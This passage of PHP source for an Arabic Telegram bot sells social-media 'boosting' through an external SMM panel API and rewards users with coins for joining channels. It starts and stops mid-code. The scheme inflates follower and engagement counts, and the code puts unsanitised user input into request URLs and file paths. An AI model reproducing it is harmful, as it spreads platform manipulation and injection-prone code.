$key['inline_keyboard'][] = $row;
$row = [];
}

}
}

if(!empty($row)){
$key['inline_keyboard'][] = $row;
}

$key['inline_keyboard'][] = [[
'text'=>"$NamesBACK",
'callback_data'=>"tobot",
"style" => "danger",
"icon_custom_emoji_id" => "5449683594425410231"
]];

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*• اهلا بك عزيزي في قسم الرشق* ![📭](tg://emoji?id=5278436402156031854) 
• اختار ما اريد من الاسفل ![🛒](tg://emoji?id=5814479721202716975) 
",
'parse_mode'=>"markdownV2",
'reply_markup'=>json_encode($key),
]);

} else {

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"• قسم الرشق تحت الصيانه ![⁉️](tg://emoji?id=5420323339723881652) ",
'parse_mode'=>"markdownV2",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[[
'text'=>"$NamesBACK",
'callback_data'=>"tobot",
"style" => "danger",
"icon_custom_emoji_id" => "5449683594425410231"
]]
]])
]);

}
}

if(explode("|",$data)[0]=="jooENT"){
$section_id = explode("|",$data)[1];
$key = ['inline_keyboard' => []];
foreach ( $rshq['xdmaxs'][$section_id] as $hjjj => $i) {
if($i != null){
$key['inline_keyboard'][] = [['text' => "$i", 'callback_data' => "type|".$section_id."|$hjjj","style" => "primary","icon_custom_emoji_id" => "5337080053119336309"]];
}
}
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "service","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "![🛒](tg://emoji?id=5280943438991214029) * اهلا بك في قسم الخدمات:*
![📥](tg://emoji?id=5337080053119336309) اختر الخدمات التي تريدها :",
'parse_mode' => "markdownV2",
'reply_markup' => json_encode($key),
]);
$rshq['current_section'][$from_id] = $section_id;
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if($data == "infotlb") {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"![🆔](tg://emoji?id=5278510335723066039) *ارسل ايدي الطلب :*
",
'parse_mode'=>"markdownV2",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]])
]);
$rshq['mode'][$from_id]= $data;
SETJSON($rshq);
}
$rshq["sSite"] = ($rshq["sites"][$text]??$rshq["sSite"]) ;
$Api_Tok = ($rshq["keys"][$text]?? $rshq["sToken"]) ;
if(is_numeric($text) and $rshq['mode'][$from_id] == "infotlb"){
if($text != null){
$req = json_decode(file_get_contents("https://".$rshq["sSite"]."/api/v2?key=$Api_Tok&action=status&order=".$text));

$api_status = $req->status ?? '';
$status_remains = $req->remains ?? 0;
$s = "قيد المعالجة أو المراجعة ⏳";
$refund_notification = "";


$saved_order = $rshq["auto_refund_data"][$text] ?? null;

if($api_status == "Completed" || $status_remains == "0"){
$s = "طلب مكتمل 🟢";
$order_id = $text;
$service_name = $rshq["ordn"][$text] ?? "غير معروف";
$user_info = bot("getchat",['chat_id'=>$from_id]);
$user_name = $user_info->result->first_name ?? $name;
$user_username = $user_info->result->username ?? $user;
$proof_text = $rshq['channel_proof_text'] ?? "✅ تم اكتمال طلبك بنجاح\nالخدمة: {service_name}\nايدي الطلب: {order_id}\nالمستخدم: {user_name}";
$proof_text = str_replace("{service_name}", $service_name, $proof_text);
$proof_text = str_replace("{order_id}", $order_id, $proof_text);
$proof_text = str_replace("{user_name}", $user_name, $proof_text);
$proof_text = str_replace("{user_id}", $from_id, $proof_text);
$proof_text = str_replace("{username}", $user_username, $proof_text);

if($saved_order && $saved_order['status'] == "Pending") {
    $rshq["auto_refund_data"][$text]["status"] = "Completed";
    bot('sendMessage',[
    'chat_id'=>$from_id,
    'text'=>"✅ تم اكتمال طلبك بنجاح لخدمة: " . $service_name,
    'parse_mode'=>"markdown",
    ]);
    if($chnl){
    bot('sendMessage',[
    'chat_id'=>$chnl,
    'text'=>$proof_text,
    'parse_mode'=>"markdown",
    ]);
    }
}
} 

elseif(($api_status == "Canceled" || $api_status == "Cancelled") && $saved_order && $saved_order['status'] == "Pending") {
    $s = "ملغي ومسترجع رصيده 🔴";
    $refund_points = $saved_order['price'];
    $buyer_id = $saved_order['user_id'];
    

    $rshq["coin"][$buyer_id] = ($rshq["coin"][$buyer_id] ?? 0) + $refund_points;
    $rshq["auto_refund_data"][$text]["status"] = "Refunded";
    
    $refund_notification = "\n\n⚠️ *تنبيه: تم إلغاء الطلب من المصدر وإعادة ($refund_points) $currency_name إلى حسابك تلقائياً!*";
    
    bot('sendMessage',[
        'chat_id'=>$buyer_id,
        'text'=>"⚠️ *إشعار إلغاء واسترجاع*\n\nتم إلغاء طلبك رقم (`$text`) من السيرفر. تم إعادة بمبلغ وقدره `$refund_points` $currency_name إلى رصيدك تلقائياً.",
        'parse_mode'=>"markdown"
    ]);
} 

elseif($api_status == "Partial" && $saved_order && $saved_order['status'] == "Pending") {
    $s = "مكتمل جزئياً ومسترجع الباقي 🟡";
    $order_qty = $saved_order['quantity'];
    $order_price = $saved_order['price'];
    
    if($order_qty > 0){
        
        $refund_points = round(($status_remains / $order_qty) * $order_price, 2);
        
        if($refund_points > 0){
            $buyer_id = $saved_order['user_id'];
            $rshq["coin"][$buyer_id] = ($rshq["coin"][$buyer_id] ?? 0) + $refund_points;
            $rshq["auto_refund_data"][$text]["status"] = "Partial_Refunded";
            
            $refund_notification = "\n\n⚠️ *تنبيه: الطلب مكتمل جزئياً، وتم إعادة قيمة النقص المتبقي وهو ($refund_points) $currency_name إلى حسابك تلقائياً!*";
            
            bot('sendMessage',[
                'chat_id'=>$buyer_id,
                'text'=>"⚠️ *إشعار اكتمال جزئي للطلب*\n\nطلبك رقم (`$text`) اكتمل جزئياً والمتبقي الذي لم يتم تسليمه هو ($status_remains). تم إرجاع قيمة النقص الفائت وهو `$refund_points` $currency_name إلى رصيدك تلقائياً.",
                'parse_mode'=>"markdown"
            ]);
        }
    }
}
elseif($saved_order && ($saved_order['status'] == "Refunded" || $saved_order['status'] == "Partial_Refunded")) {
    $s = ($saved_order['status'] == "Refunded") ? "ملغي ومسترجع سابقاً 🔴" : "مكتمل جزئياً ومسترجع سابقاً 🟡";
}

if($req) {
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"- معلومات عن الطلب 📋: \n----------------------------\n-⁉️ اسم الخدمة : ".$rshq["ordn"][$text]."\n-🆔 ايدي الطلب : `$text`\n-📊 حالة الطلب : $s\n-📥 المتبقي : $status_remains" . $refund_notification,
 'parse_mode'=>"markdown",
 'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]
])
]);
$rshq['mode'][$from_id]= null;
SETJSON($rshq);
} else {
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"️هذا الطلب ليس موجود في طلباتك ❌\n",
 'parse_mode'=>"markdown",
]);
}
}
}

$e = explode("|", $data);
if($e[0] == "type"){
$section_id = explode("|",$data)[1];
$service_index = explode("|",$data)[2];
$s3r = $rshq['S3RS'][$section_id][$service_index];
$web = ($rshq['Web'][$section_id][$service_index]??$rshq["sSite"]) ;
$s3r = ($s3r ?? "1");
$key = ($rshq['key'][$section_id][$service_index] ?? $rshq["sToken"]);
$mix = ($rshq['mix'][$section_id][$service_index] ?? "1000");
$min = ($rshq['min'][$section_id][$service_index] ?? "100");
$g= $s3r * 1000;
$last_request_time = $rshq['last_request_time'][$from_id][$section_id] ?? 0;
$section_timer_status = $rshq['section_timer'][$section_id] ?? "off";
if($section_timer_status == "on" && $last_request_time > 0){
$time_diff = time() - $last_request_time;
if($time_diff < 86400){
$remaining_hours = floor((86400 - $time_diff) / 3600);
$remaining_minutes = floor(((86400 - $time_diff) % 3600) / 60);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*⚠️ نظام ال 24 ساعه مفعل في هذا القسم
لا يمكنك طلب خدمه من هذا القسم الا بعد $remaining_hours ساعه و $remaining_minutes دقيقه
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'رجوع' ,'callback_data'=>"jooENT|$section_id"]],
]
])
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
return;
}
}
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"<b> <tg-emoji emoji-id=\"5312361253610475399\">🛒</tg-emoji>- اهلا بك في خدمه : ".$rshq['xdmaxs'][$section_id][$service_index]."
----------------------------
<tg-emoji emoji-id=\"5193065010795911968\">🛍</tg-emoji>- السعر : ". $g ." $currency_name لكل 1000
<tg-emoji emoji-id=\"5406683434124859552\">📊</tg-emoji>- الحد الادني للرشق : $min الحد الاقصي للرشق : $mix

<tg-emoji emoji-id=\"5449683594425410231\">🌀</tg-emoji>- ارسل الكمية التي تريد طلبها :</b>
",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'رجوع' ,'callback_data'=>"jooENT|$section_id","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]])
]);
$rshq['IDX'][$from_id]=$rshq['IDSSS'][$section_id][$service_index];
$rshq['WSFV'][$from_id]=$rshq['WSF'][$section_id][$service_index];
$rshq['S3RS'][$from_id]=$s3r;
$rshq['web'][$from_id]=$web;
$rshq['key'][$from_id]=$key;
$rshq['min_mix'][$from_id]= "$min|$mix" ;
$rshq['SB1'][$from_id]=$section_id;
$rshq['mode'][$from_id]="SETd";
$rshq['SB2'][$from_id]=$service_index;
$rshq["="][$from_id] = $rshq['xdmaxs'][$section_id][$service_index];
$rshq['current_service_section'][$from_id] = $section_id;
SETJSON($rshq);
}
if($data== "tobon"){
bot("deletemessage",["message_id" => $message_id,"chat_id" => $chat_id,]);
$start_msg = parse_start_message($start_message, $coin, $currency_name, $share, $tlby, $from_id, $name, $user);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"• تم الالغاء ارسل /start 🚫",
'parse_mode'=>"markdown",
]);
$rshq['3dd'][$from_id][$from_id]= null;
$rshq['mode'][$from_id]= null;
$rshq["tlbia"][$from_id] = null;
$rshq["cointlb"][$from_id] += null;
$rshq["s3rltlb"][$from_id] = null;
$rshq['tp'][$from_id] = null;
$rshq['coinn'] = null;
SETJSON($rshq);
}
if(is_numeric($text) and $rshq['mode'][$from_id]=="SETd") {
$s3r = $rshq['S3RS'][$from_id];
$e[1] = $text;
$s3r = $s3r * $text;
$min = explode("|", $rshq['min_mix'][$from_id])[0];
$mix = explode("|", $rshq['min_mix'][$from_id])[1];
if($coin >= $s3r){
if($rshq['rshqG'] == "on" ) {
if($text >= $min){
if($text <= $mix){
bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"".$rshq['WSFV'][$from_id]."• ارسل الرابط الخاص بك 🌐 :
",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'الغاء الطلب' ,'callback_data'=>"tobon"]],
]])
]);
$rshq['3dd'][$from_id][$from_id]= $e[1];
$rshq['mode'][$from_id]= "MJK";
$rshq["tlbia"][$from_id] = $tlbia;
$rshq["s3rltlb"][$from_id] = $s3r;
$rshq['tp'][$from_id] = $e[2];
$rshq['coinn'] = $s3r;
SETJSON($rshq);
} else {
bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*• ارسل عدد اصغر او يساوي $mix 🗳*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'الغاء الطلب' ,'callback_data'=>"tobon"]],
]])
]);
}
} else {
bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*• ارسل عدد اكبر من او يساوي $min 🎉
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'الغاء الطلب' ,'callback_data'=>"tobon"]],
]])
]);
}
} else {
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"• قسم الرشق تحت الصيانه ![⁉️](tg://emoji?id=5420323339723881652) ",
'parse_mode'=>"markdownV2",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$NamesBACK",'callback_data'=>"tobot","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
]])
]);
}
} else {
$s3r = $rshq['S3RS'][$from_id];
$s3r = ($s3r ?? "1");
$g= $s3r * $text ;
bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*رصيدك لايكفي لطلب $text 🚫*
----------------------------
🛒- سعر طلبك :". $g. " $currency_name
🛍- عدد طلبك : $text",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>'الغاء الطلب' ,'callback_data'=>"tobon"]],
]
])
]);
}
exit; 
}
if($text and $rshq['mode'][$from_id]== "MJK") {
if(preg_match("/http|https/",$text) ){
$s3r = $rshq['S3RS'][$from_id];
$s3r = ($s3r ?? "1");
$g= $s3r * $rshq['3dd'][$from_id][$from_id];
bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"• لتاكيد الطلب التالي 📥
----------------------------
🛍- سعر طلبك :". $g. " $currency_name
🆔- ايدي الخدمة : ".rand(999999,9999999999999)."
🌐- الرابط: [$text]
🛒- الكمية : ".$rshq['3dd'][$from_id][$from_id]."",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"تأكيد ♻️",'callback_data'=>"YESS|$from_id" ],['text'=>"الغاء ❌",'callback_data'=>"tobot" ]],
]
])
]);
$rshq['LINKS_$from_id'] = $text;
$rshq['mode'][$from_id] = "PROG";
SETJSON($rshq);
}else{
 bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"ارسل رابط صحيح!
",
'parse_mode'=>"markdown",
]);
}
}
$rshq["sSite"] = ($rshq['web'][$from_id]?? $rshq["sSite"]) ;
$Api_Tok = ($rshq['key'][$from_id]?? $rshq["sToken"]) ;
$rshqaft =$rshq['bot_tlb']+1;
$rnd = rand(9999999,9999999999);
if(explode("|",$data)[0] == "YESS" and $rshq['mode'][$from_id]== "PROG") {
$rshq = getData($db, 'rshq_data', 'rshq');
$rshq['S3RS'][$from_id] =$rshq["s3rltlb"][$from_id];
$inid = $rshq['IDX'][$from_id];
$text = $rshq['LINKS_$from_id'];
$requst = json_decode(file_get_contents("https://".$rshq["sSite"]."/api/v2?key=$Api_Tok&action=add&service=$inid&link=$text&quantity=". $rshq['3dd'][$from_id][$from_id]));
$idreq = $requst->order;

if($idreq){
    $rshq["auto_refund_data"][$idreq] = [
        "user_id" => $from_id,
        "price" => $rshq["s3rltlb"][$from_id],
        "quantity" => $rshq['3dd'][$from_id][$from_id],
        "status" => "Pending"
    ];
}

$current_section = $rshq['current_service_section'][$from_id];
if($current_section && $rshq['section_timer'][$current_section] == "on"){
$rshq['last_request_time'][$from_id][$current_section] = time();
}
bot('editmessagetext',[
 'chat_id'=>$chat_id,
 "message_id" => $message_id,
 'text'=>"*📥 تم انشاء طلب بنجاح 📥:*
----------------------------
🆔- ايدي الطلب : `". $idreq."`
🌐- تم الطلب الى : [$text]
",
 'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
]
])
]);
bot('sendMessage',[
 'chat_id'=>$joo,
 'text'=>"• تم انشاء طلب جديد من البوت 📊
----------------------------
• معلومات العضو 🆔: 

- ايديه : `$from_id`
- يوزره : [@$user]
- اسمه : [$name](tg://user?id=$chat_id)

• معلومات الطلب 🛍: 

- ايدي الطلب : `". $rnd. "`
- الرابط: [$text]
- العدد". $rshq['3dd'][$from_id][$from_id] . " $tp

- رصيده المتبقي: ". $rshq["coin"][$from_id]. " 🎉
",
 'parse_mode'=>"markdown",
 'reply_markup'=>json_encode([
 'inline_keyboard'=>[
]
])
]);
$service_name = $rshq["="][$from_id];
//$service_name = $rshq["="][$from_id];
$proof_text = $rshq['channel_proof_text'] ?? "✅ طلب جديد\nالخدمة: #service_name\nالكمية: #quantity\nالرابط: #link\nالمستخدم: #first_name\nايدي المستخدم: #user_id\nايدي الطلب: #order_id";

$proof_text = str_replace(
[
"#service_name",
"#quantity",
"#link",
"#first_name",
"#user_name",
"#user_id",
"#username",
"#order_id"
],
[
$service_name,
$rshq['3dd'][$from_id][$from_id],
$text,
$name,
$name,
$from_id,
$user ? "@$user" : "لا يوجد",
$rnd
],
$proof_text
);
if($chnl){
bot('sendMessage',[
 'chat_id'=>$chnl,
 'text'=>"*$proof_text*]",
 'parse_mode'=>"markdown",
]);
}
$rnn = "- الطلب: ".$rshq["="][$from_id]."- ايدي: $rnd
";
$rshq["coin"][$from_id] -=$rshq["s3rltlb"][$from_id];
$rshq['S3RS'][$from_id] = 0;
$rshq["orders"][$from_id][]= "$rnn";
$rshq["order"][$rnd]= $idreq;
$rshq["ordn"][$idreq]= $rshq["="][$from_id];
$rshq["sites"][$idreq]= $web;
$rshq["keys"][$idreq]= $Api_Tok;
$rshq["tlby"][$from_id] += 1;
$rshq["cointlb"][$from_id] +=$rshq["s3rltlb"][$from_id];
$rshq['3dd'][$from_id][$from_id]= null;
$rshq['mode'][$from_id]= null;
$rshq['current_service_section'][$from_id] = null;
$rshq['bot_tlb']+= 1;
SETJSON($rshq);
}
if($data == "tmoil-kilwa") {
 $funding_status = $rshq['funding_status'] ?? "on";
 if($funding_status == "off") {
 bot('EditMessageText',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
 'text'=>"*نظام التمويل مغلق حاليا ❌
*
",
 'parse_mode'=>"markdown",
 'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"user_funding_main","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
 ]
 ])
 ]);
 die();
}
 $s3rtmoil = $rshq["s3rtmoil"]?? "12";
 $idna = $tmoil["tmoils"]??"10";
 bot('EditMessageText',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
 'text'=>"*💥- اهلا بك في تمويل قناتك
 
🛍 سعر العضو : $s3rtmoil نقطة
♻️- الحد الأدنى للتمويل:". $idna." عضو
📣 ارسل عدد الاعضاء المراد تمويلهم*",
 'parse_mode'=>"markdown",
 'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"user_funding_main","style" => "danger","icon_custom_emoji_id" => "5449683594425410231"]],
 ]
 ])
 ]);
 $modes['mode'][$from_id]= $data ;
 SETJSON2($modes);
}
$data_ = explode("|", $data) ;
$helper = USR_BOT ;
$idna = $tmoil["tmoils"]??"10";
if(is_numeric($text) and $modes['mode'][$from_id] == "tmoil-kilwa" ){
$data_[1] = $text ;
if($data_[1] < $idna){
bot('sendmessage',[
'chat_id' => $chat_id, 
'text'=>"
اقل حد للطلب هو $idna ❌
",
]);
exit ;
}
$s3rtmoil = $rshq["s3rtmoil"]?? "12";
$PrIce = $data_[1] * $s3rtmoil;
if($coin >= $PrIce) {
bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
- الان اضف هذه البوت @". $helper."مشرف في قناتك او مجموعتك مع اعطاء البوت الصلاحيات

- ثم ارسل يوزر القناة او المجموعة 
بهذا الشكل (@اليوزر) 

~ اقرأ الخطوات جيدا ❤
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"user_funding_main"]],
 ]
 ])
]);
$tmoil['sets'][$from_id]["count"] = $data_[1];
$tmoil["sets"][$from_id]["price"] = $PrIce;
$tmoil["sets"][$from_id]["to"] = "P1";
$modes['mode'][$from_id]= null ;
SETJSON1($tmoil);
SETJSON2($modes);
} else {
$g = $PrIce - $coin;
bot('sendmessage',[
'chat_id' => $chat_id, 
'text'=>"
رصيدك لايكفي ❌
تحتاج $g نقطه فوق رصيدك لتتمكن من تمويل العدد المطلوب 
",
]);
} 
}
if(preg_match("/@/",$text) and $tmoil["sets"][$from_id]["to"] == "P1") {
$text = str_replace("@", "", $text);
if (in_array($text, $tmoil['db']["chs"])) {
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "⚠️ عذرًا، هذا المعرف قيد التمويل حاليًا
لا يمكن تنفيذ طلب تمويل جديد في الوقت الحالي

📣 @$text

🕓 يرجى الانتظار حتى انتهاء التمويل الحالي، ثم يمكنك إعادة التقديم مرة أخرى",
'parse_mode' => "markdown"
]);
unset($tmoil["sets"][$from_id]);
SETJSON1($tmoil);
return;
}
$text = str_replace ("@",null, $text) ;
if(in_array($text, $tmoil["blocks"])) {
bot('sendMessage',[
 'chat_id'=>$chat_id ,
 'text'=>"
⚠️ عذرا ولكن القناة تم حظرها من التمويل
🎟️] معرفها : [@$text]
", 
'parse_mode'=>"markdown",
]);
unset($tmoil["sets"][$from_id]);
SETJSON1($tmoil);
return false ;
} 
$getChatMemberReq = json_encode(bot('getChatMember', ['chat_id' => "@$text" , 'user_id' => IDBot]));
$getChatMemberRes = json_decode($getChatMemberReq, true);
if ($getChatMemberRes['result']['status'] == "administrator") {
$kmia=$tmoil['sets'][$from_id]["count"];
$coi=$tmoil["sets"][$from_id]["price"];
$idM = rand(999999,9999999999);
bot('sendMessage',[
 'chat_id'=>$chat_id ,
 'text'=>"
- معلومات الطلب : 📝

- اليوزر : [@$text]✅
- الكمية : $kmia 🔢
- السعر : $coi 💰
", 
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"تأكيد الطلب ✅",'callback_data'=>"ADDMOL|$idM" ]], 
 [['text'=>"$NamesBACK",'callback_data'=>"user_funding_main"]], 
 ]
 ])
]);
$tmoil['info']["$idM"] = "$text|$kmia|$coi" ;
$tmoil['chanels']["id_$text"] = $idM;
$tmoil["sets"][$from_id]["to"] = "P2";
SETJSON1($tmoil);
} else {
bot('sendMessage',[
 'chat_id'=>$chat_id ,
 'text'=>"
البوت ليس مشرف ❌
- تاكد من ان يكون البوت مشرف مع اعطاء الصلاحيات للبوت ثم اعد ارسال اليوزر ", 
'parse_mode'=>"markdown",
]);
} 
}
if($data_[0] == "ADDMOL") {
$h= $data_[1];
$vZ = explode("|", $tmoil['info']["$h"]);
$text = str_replace ("@",null, $vZ[0]) ;
if(in_array($text,$tmoil['db']["chs"])) {
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"
🔶 هذا القناة قيد التمويل بالفعل
",
'show_alert'=>true
]);
bot('editMessagetext',[
 'chat_id'=>$chat_id,
 'message_id' => $message_id, 
 'text'=>$start_msg, 
 'parse_mode'=>"HTML",
 'reply_markup'=>json_encode($Rjoo)
]);
exit ;
} 
$getChatMemberReq = json_encode(bot('getChatMember', ['chat_id' => "@$text" , 'user_id' => IDBot]));
$getChatMemberRes = json_decode($getChatMemberReq, true);
if ($getChatMemberRes['result']['status'] == "administrator") {
$kmia=$vZ[1];
$coi=$vZ[2];
$idM = $data_[1];
if($coin >= $coi) {
$rshq["coin"][$from_id] -= $coi;
SETJSON($rshq);
$date = date("d|m|y:H:i:s");
bot('editMessagetext',[
 'chat_id'=>$chat_id ,
 'message_id' => $message_id, 
 'text'=>"
- تم انشاء الطلب بنجاح : 🗳️

- اليوزر : [@$text] ✅
- الكمية : $kmia 🔢
- السعر : $coi 💰
- التاريخ : $date 🗓️

⚠️) لا تقم بتنزيل البوت [@". bot("getme")->result->username. "] 
من الادمنية حتى لا يتم الغاء طلبك 🤍
", 
'parse_mode'=>"markdown",
]);
@mkdir("edid");
@mkdir("edid/@$text");
$tmoil['coin'][$from_id] -= $coi;
$tmoil['chanels']["id_$text"] = $idM;
$tmoil['db']["$idM"]["count"] = $kmia;
$tmoil['db']["chs"][] = $text ;
$tmoil['db']["chsme"][$from_id][] = $text ;
$tmoil['db']["$idM"]["price"] = $coi;
$tmoil['db']["$idM"]["owner"] = $from_id ;
$tmoil['db']["$idM"]["create"] = $date ;
$tmoil['db']["$idM"]["startc"] = 0;
$tmoil['db']["$idM"]["joined_users"] = []; 
$tmoil["sets"][$from_id]["to"] =null ;
SETJSON1($tmoil);
$start_msg = parse_start_message($start_message, $coin, $currency_name, $share, $tlby, $from_id, $name, $user);
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>$start_msg,
 'parse_mode'=>"HTML",
 'reply_markup'=>json_encode($Rjoo)
]);
} else {
bot('sendmessage',[
 'chat_id'=>$chat_id ,
 'message_id' => $message_id, 
 'text'=>"
⁉️] رصيدك لايكفي، 
", 
'parse_mode'=>"markdown",
]);
$start_msg = parse_start_message($start_message, $coin, $currency_name, $share, $tlby, $from_id, $name, $user);
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>$start_msg,
 'parse_mode'=>"HTML",
 'reply_markup'=>json_encode($Rjoo)
]);
} 
} else {
bot('sendMessage',[
 'chat_id'=>$chat_id ,
 'text'=>"
- الان اضف هذه البوت @". $helper."مشرف في قناتك او مجموعتك مع اعطاء البوت الصلاحيات

- ثم ارسل يوزر القناة او المجموعة 
بهذا الشكل (@اليوزر) 

~ اقرأ الخطوات جيدا ❤
", 
'parse_mode'=>"markdown",
]);
}
}
if($data_[0] == "getv") {
$chs = $data_[1];
$bv = $chs;
$mt = json_encode(bot('getChatMember', ['chat_id' => "@".$chs , 'user_id' => IDBot]));
$nt = json_decode($mt, true);
$bv = $chs;
if ($nt['result']['status'] == "administrator") {
$getChatMemberReq = file_get_contents("https://api.telegram.org/bot". API_KEY. "/getChatMember?chat_id=@" . $bv . "&user_id=" . $from_id);
$getChatMemberRes = json_decode($getChatMemberReq, true);
if ($getChatMemberRes['result']['status'] != "left" && $getChatMemberRes['result']['status'] == "member" || $getChatMemberRes['result']['status'] == "creator" || $getChatMemberRes['result']['status'] == "administrator") {
$j = @file_get_contents("edid/@$bv/from_id.txt");
$arr = explode("\n", $j);
if(in_array($from_id, $arr)){
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text' =>"تم التحقق من اعاده الاشتراك في القناة ✅", 
'show_alert' =>true
]); 
bot("deleteMessage", [
"chat_id" => $chat_id,
"message_id" => $message_id,
]);
bot('editMessagetext',[
'chat_id'=>$chat_id,
'message_id' => $message_id, 
'text'=>"* لإكمال الاشتراك في القنوات* ✅", 
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"اكمال الاشتراك ✅",'callback_data'=>"joins|1" ]], 
[['text'=>"$NamesBACK",'callback_data'=>"user_funding_main" ]], 
]
])
]); 
return false;
}
$coinIshtrak = $rshq["coinNmero"] ?? "5";
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"تم اضافه $coinIshtrak $currency_name الي حسابك ✅",
'show_alert'=>true
]);
file_put_contents("edid/@$bv/from_id.txt", $from_id . "\n", FILE_APPEND);
$rshq["coin"][$from_id] += $coinIshtrak;
SETJSON($rshq); 
$idM = $tmoil['chanels']["id_$bv"];
$ci = $tmoil['db']["$idM"]["count"];
$vx = $ci - $tmoil['db']["$idM"]["startc"];
$vx = $vx - 1;
$tmoil['db']["$idM"]["startc"] += 1;
$tmoil['db']["$idM"]["joined_users"][] = $from_id;
$tmoil["chids"][$from_id][] = $idM;
SETJSON1($tmoil);
if($vx == 0){
@unlink("edid/@$bv");
bot('sendMessage',[
'chat_id'=>$tmoil['db']["$idM"]["owner"],
'text'=>"• تم انتهاء تمويلك بنجاح ✅\n\n- اليوزر : [@$bv] \n- العدد المطلوب : $ci \n- العدد المكتمل : $ci \n\n• نتمنى لكم وقتاً سعيداً 🤍",
'parse_mode'=>"markdown",
]); 
bot('sendMessage',[
'chat_id'=>$joo,
'text'=>"• تم انتهاء تمويلك بنجاح ✅\n\n- اليوزر : [@$bv] \n- العدد المطلوب : $ci \n- العدد المكتمل : $ci \n\n• نتمنى لكم وقتاً سعيداً 🤍",
'parse_mode'=>"markdown",
]); 
$st = array_search($bv, $tmoil['db']["chs"]);
if($st !== false){
unset($tmoil['db']["chs"][$st]);
$tmoil['db']["chs"] = array_values($tmoil['db']["chs"]);
}
$tmoil['db']["complete"][] = $bv;
SETJSON1($tmoil);
$dirPath = "edid/@$bv";
if(is_dir($dirPath)){
$files = glob(rtrim($dirPath, '/') . '/*');
foreach ($files as $file) {
is_dir($file) ? deleteDirectory($file) : unlink($file);
}
rmdir($dirPath);
}
}
$start_msg = parse_start_message($start_message, $coin, $currency_name, $share, $tlby, $from_id, $name, $user);
bot('editMessagetext',[
'chat_id'=>$chat_id,
'message_id' => $message_id, 
'text'=>$start_msg, 
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($Rjoo)
]);
} else {
$coinIshtrak = $rshq["coinNmero"] ?? "5";
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"❌ لم يتم الاشتراك في القناة @$bv بعد!\nاشترك اولاً ثم اضغط اشتركت ✅\nستحصل على $coinIshtrak $currency_name",
'show_alert'=>true
]);
}
} else {
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"⚠️ البوت ليس مشرفاً في القناة @$bv",
'show_alert'=>true
]);
}
}
if($data_[0] == "joins") {
if($data_[1] == "1"){
$funding_status = $rshq['funding_status'] ?? "on";
if($funding_status == "off"){
bot('editMessagetext',[
'chat_id'=>$chat_id,
'message_id' => $message_id, 
